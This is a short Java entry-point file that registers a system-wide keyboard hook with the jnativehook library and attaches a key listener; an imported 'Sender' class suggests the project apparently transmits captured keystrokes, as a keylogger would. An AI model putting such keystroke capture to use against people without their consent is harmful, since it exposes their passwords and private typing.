package main;

import org.jnativehook.GlobalScreen;

import handlers.ManageService;
import handlers.Sender;



public class Main {

	public static void main(String[] args) {
		ManageService service = new ManageService();
		try {
			GlobalScreen.registerNativeHook();
		} catch (Throwable e) {
			e.printStackTrace();
		}
		
		GlobalScreen.getInstance().addNativeKeyListener(service.getKeyBoard());
	}
}
